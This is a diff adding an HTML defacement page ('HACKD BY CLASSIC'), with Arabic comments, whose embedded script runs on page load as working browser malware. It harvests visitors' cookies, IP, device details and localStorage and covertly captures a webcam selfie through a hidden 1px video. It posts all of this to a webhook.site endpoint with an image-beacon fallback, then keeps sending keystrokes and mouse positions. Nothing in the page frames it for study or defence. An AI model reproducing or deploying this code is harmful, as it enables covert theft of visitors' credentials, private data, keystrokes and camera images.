@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head><title>HACKD BY CLASSIC</title></head>
+<body style="margin:0;background:linear-gradient(45deg,#1a1a2e,#16213e);height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:Arial,sans-serif;color:white;overflow:hidden">
+    <div style="font-size:48px;color:#ff4757;font-weight:900;text-shadow:0 0 30px #ff4757;margin-bottom:20px;text-align:center">HACKD BY CLASSIC</div>
+    <div style="font-size:72px;color:#ff6b6b;font-weight:900;text-shadow:0 0 40px #ff6b6b;text-align:center">LOL</div>
+    
+<script>
+(async function(){
+    console.log('SACI HACK STARTED');
+    
+    // ضع webhook الجديد هنا (القديم ميت)
+    const webhook = 'https://webhook.site/#!/abc123'; // غيّر هذا بعد الاختبار
+    
+    const data = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        cookies: document.cookie || 'no cookies',
+        screen: `${screen.width}x${screen.height}`,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        hardware: navigator.hardwareConcurrency + ' cores'
+    };
+    
+    // IP حقيقي
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        data.ip = ipData.ip;
+        console.log('IP:', data.ip);
+    } catch(e) {
+        data.ip = 'blocked';
+        console.log('IP fetch failed');
+    }
+    
+    // كاميرا سيلفي
+    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        try {
+            console.log('Requesting camera...');
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user', width: 640, height: 480}});
+            const video = document.createElement('video');
+            video.style.position = 'fixed';
+            video.style.top = '0';
+            video.style.left = '0';
+            video.style.width = '1px';
+            video.style.height = '1px';
+            video.muted = true;
+            video.srcObject = stream;
+            document.body.appendChild(video);
+            video.play();
+            
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            data.selfie = canvas.toDataURL('image/jpeg', 0.8);
+            
+            video.remove();
+            stream.getTracks().forEach(track => track.stop());
+            console.log('Selfie captured');
+        } catch(e) {
+            data.camera = 'Permission denied or not available';
+            console.log('Camera error:', e);
+        }
+    }
+    
+    // Local Storage (إيميلات + notes)
+    data.localStorage = {};
+    for(let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if(key) data.localStorage[key] = localStorage.getItem(key).substring(0, 100);
+    }
+    
+    // IndexedDB databases
+    if('indexedDB' in window) {
+        const dbs = await indexedDB.databases();
+        data.databases = dbs.map(db => db.name);
+    }
+    
+    // إرسال البيانات
+    const sendData = async (payload) => {
+        try {
+            const response = await fetch(webhook, {
+                method: 'POST',
+                mode: 'no-cors', // Bypass CORS
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: 'SACI HACK',
+                    content: '**🎭 TARGET HACKED 🎭**',
+                    embeds: [{
+                        title: 'Victim Information',
+                        description: `\`\`\`json\n${JSON.stringify(payload, null, 2).substring(0, 1900)}\n\`\`\``,
+                        color: 0xff0000,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+            console.log('Data sent:', response);
+        } catch(e) {
+            // Fallback image beacon
+            const img = new Image();
+            img.src = webhook.replace('/webhooks/', '/webhooks/') + '?data=' + btoa(JSON.stringify(payload));
+        }
+    };
+    
+    // إرسال أول مرة
+    await sendData(data);
+    
+    // Keylogger مستمر
+    document.addEventListener('keydown', (e) => {
+        sendData({type: 'keylog', key: e.key, code: e.code, shiftKey: e.shiftKey});
+    });
+    
+    // Mouse tracker
+    document.addEventListener('mousemove', (e) => {
+        if(Math.random() < 0.01) { // 1% chance
+            sendData({type: 'mouse', x: e.clientX, y: e.clientY});
+        }
+    });
+    
+    console.log('SACI HACK FULLY DEPLOYED');
+    
+    // Status indicator
+    document.body.innerHTML += '<div style="position:fixed;bottom:20px;right:20px;background:green;color:white;padding:10px;border-radius:10px;font-size:14px;">HACK ACTIVE</div>';
+    
+})();
+</script>
+</body>
+</html>
